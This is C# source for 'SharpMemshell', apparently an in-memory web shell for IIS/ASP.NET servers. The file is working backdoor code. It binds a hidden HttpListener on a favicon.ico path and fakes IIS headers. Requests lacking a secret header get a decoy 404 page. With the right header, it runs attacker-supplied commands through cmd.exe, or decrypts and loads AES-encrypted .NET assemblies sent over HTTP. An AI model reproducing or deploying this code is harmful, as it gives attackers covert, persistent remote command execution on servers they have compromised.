using System.Diagnostics;
using System.Text;
using System.IO;
using System.Net;
using System.Web;
using System;
using System.Collections.Generic;
using System.Collections;
using System.Threading;

public class SharpMemshell
{
    //For EXE
    static void Main(string[] args)
    {
        HttpContext ctx = HttpContext.Current;
        Thread Listen = new Thread(Listener);
        Thread.Sleep(0);
        Listen.Start(ctx);
    }

    public SharpMemshell()
    {
        HttpContext ctx = HttpContext.Current;
        Thread Listen = new Thread(Listener);
        Thread.Sleep(0);
        Listen.Start(ctx);
    }
    public static void log(string data)
    {
        try
        {
            string logfile = "c:\\log.txt";
            if (!File.Exists(logfile))
            {
                byte[] output = System.Text.Encoding.Default.GetBytes(data);
                FileStream fs = new FileStream(logfile, FileMode.Create);
                fs.Write(output, 0, output.Length);
                fs.Flush();
                fs.Close();
            }
            else
            {
                using (StreamWriter sw = new StreamWriter(logfile, true))
                {
                    sw.WriteLine(data);
                }
            }
        }
        catch(Exception e)
        {
            Console.WriteLine("Log error! Error: \n{0}",e);
        }

    }

    public static Dictionary<string, string> parse_post(HttpListenerRequest request)
    {
        var post_raw_data = new StreamReader(request.InputStream, request.ContentEncoding).ReadToEnd();
        Dictionary<string, string> postParams = new Dictionary<string, string>();
        string[] rawParams = post_raw_data.Split('&');
        foreach (string param in rawParams)
        {
            string[] kvPair = param.Split('=');
            string p_key = kvPair[0];
            string value = HttpUtility.UrlDecode(kvPair[1]);
            postParams.Add(p_key, value);
        }
        return postParams;
    }
    public static void SetRespHeader(HttpListenerResponse resp)
    {
        resp.Headers.Set(HttpResponseHeader.Server, "Microsoft-IIS/8.5");
        resp.Headers.Set(HttpResponseHeader.ContentType, "text/html; charset=utf-8");
        resp.Headers.Add("X-Powered-By", "ASP.NET");
    }

    public static void Listener(object ctx)
    {
        HttpListener listener = new HttpListener();
        try
        {
            if (!HttpListener.IsSupported)
            {
                return;
            }
            string input_key = "key";
            string pass = "pass";
            string nodata = "PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEvL0VOIiJodHRwOi8vd3d3LnczLm9yZy9UUi9odG1sNC9zdHJpY3QuZHRkIj4NCjxIVE1MPjxIRUFEPjxUSVRMRT5Ob3QgRm91bmQ8L1RJVExFPg0KPE1FVEEgSFRUUC1FUVVJVj0iQ29udGVudC1UeXBlIiBDb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXMtYXNjaWkiPjwvSEVBRD4NCjxCT0RZPjxoMj5Ob3QgRm91bmQ8L2gyPg0KPGhyPjxwPkhUVFAgRXJyb3IgNDA0LiBUaGUgcmVxdWVzdGVkIHJlc291cmNlIGlzIG5vdCBmb3VuZC48L3A+DQo8L0JPRFk+PC9IVE1MPg0K";
            string url = "http://*:80/favicon.ico/";
            listener.Prefixes.Add(url);
            listener.Start();

            byte[] not_found = System.Convert.FromBase64String(nodata);
            string key = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(input_key))).Replace("-", "").ToLower().Substring(0, 16);
            string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", "");

            Dictionary<string, dynamic> sessiontDirectory = new Dictionary<string, dynamic>();
            Hashtable sessionTable = new Hashtable();

            while (true)
            {
                HttpListenerContext context = listener.GetContext();
                HttpListenerRequest request = context.Request;
                HttpListenerResponse response = context.Response;
                SetRespHeader(response);
                Stream stm = null;
                HttpContext httpContext;
                try
                {
                    if (ctx != null)
                    {
                        httpContext = ctx as HttpContext;
                    }
                    else
                    {
                        HttpRequest req = new HttpRequest("", request.Url.ToString(), request.QueryString.ToString());
                        System.IO.StreamWriter writer = new System.IO.StreamWriter(response.OutputStream);
                        HttpResponse resp = new HttpResponse(writer);
                        httpContext = new HttpContext(req, resp);
                    }
                    var method = request.Headers["Type"];
                    if (method == "print")
                    {
                        byte[] output = Encoding.UTF8.GetBytes("OK");
                        response.StatusCode = 200;
                        response.ContentLength64 = output.Length;
                        stm = response.OutputStream;
                        stm.Write(output, 0, output.Length);
                        stm.Close();
                    }
                    else if (method == "cmd" && request.HttpMethod == "POST")
                    {
                        Dictionary<string, string> postParams = parse_post(request);

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.Arguments = "/c " + postParams[pass];
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.Start();
                        byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
                        response.StatusCode = 200;
                        response.ContentLength64 = data.Length;
                        stm = response.OutputStream;
                        stm.Write(data, 0, data.Length);
                    }
                    else if (method == "mem_b64" && request.HttpMethod == "POST")
                    {
                        Dictionary<string, string> postParams = parse_post(request);
                        byte[] data = System.Convert.FromBase64String(postParams[pass]);
                        data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);
                        Cookie sessionCookie = request.Cookies["ASP.NET_SessionId"];
                        if (sessionCookie == null)
                        {
                            Guid sessionId = Guid.NewGuid();
                            var payload = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
                            sessiontDirectory.Add(sessionId.ToString(), payload);
                            response.SetCookie(new Cookie("ASP.NET_SessionId", sessionId.ToString()));
                            byte[] output = Encoding.UTF8.GetBytes("");
                            response.StatusCode = 200;
                            response.ContentLength64 = output.Length;
                            stm = response.OutputStream;
                            stm.Write(output, 0, output.Length);
                        }
                        else
                        {
                            dynamic payload = sessiontDirectory[sessionCookie.Value];
                            MemoryStream outStream = new MemoryStream();
                            object o = ((System.Reflection.Assembly)payload).CreateInstance("LY");
                            o.Equals(outStream);
                            o.Equals(httpContext);
                            o.Equals(data);
                            o.ToString();
                            byte[] r = outStream.ToArray();
                            outStream.Dispose();
                            response.StatusCode = 200;
                            String new_data = md5.Substring(0, 16) + System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)) + md5.Substring(16);
                            byte[] new_data_bytes = Encoding.ASCII.GetBytes(new_data);
                            response.ContentLength64 = new_data_bytes.Length;
                            stm = response.OutputStream;
                            stm.Write(new_data_bytes, 0, new_data_bytes.Length);

                        }
                    }
                    else if (method == "mem_raw" && request.HttpMethod == "POST" && request.HasEntityBody)
                    {
                        int contentLength = int.Parse(request.Headers.Get("Content-Length"));
                        byte[] array = new byte[contentLength];
                        request.InputStream.Read(array, 0, contentLength);
                        byte[] data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(array, 0, array.Length);
                        if (sessionTable["payload"] == null)
                        {
                            sessionTable["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
                        }
                        else
                        {
                            object o = ((System.Reflection.Assembly)sessionTable["payload"]).CreateInstance("LY");
                            System.IO.MemoryStream outStream = new System.IO.MemoryStream();
                            o.Equals(outStream);
                            o.Equals(httpContext);
                            o.Equals(data);
                            o.ToString();
                            byte[] r = outStream.ToArray();
                            outStream.Dispose();
                            if (r.Length > 0)
                            {
                                r = new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length);
                                response.StatusCode = 200;
                                stm = response.OutputStream;
                                response.ContentLength64 = r.Length;
                                stm.Write(r, 0, r.Length);
                            }
                        }
                    }
                    else
                    {
                        response.StatusCode = 404;
                        response.ContentLength64 = not_found.Length;
                        stm = response.OutputStream;
                        stm.Write(not_found, 0, not_found.Length);
                    }
                }
                catch (Exception e)
                {
                    response.StatusCode = 404;
                    response.ContentLength64 = not_found.Length;
                    stm = response.OutputStream;
                    stm.Write(not_found, 0, not_found.Length);
                    Console.WriteLine("Exception caught1: " + e.ToString());
                    //log("Exception caught1: " + e.ToString());
                }
                finally
                {
                    if (stm != null)
                    {
                        stm.Flush();
                        stm.Close();
                    }
                    response.OutputStream.Flush();
                    response.OutputStream.Close();
                }
            }
        }
        catch (Exception e)
        {
            Console.WriteLine("Exception caught2: " + e.ToString());
            //log("Exception caught2: "+ e.ToString());
            if (listener.IsListening)
            {
                listener.Stop();
            }
        }
    }
}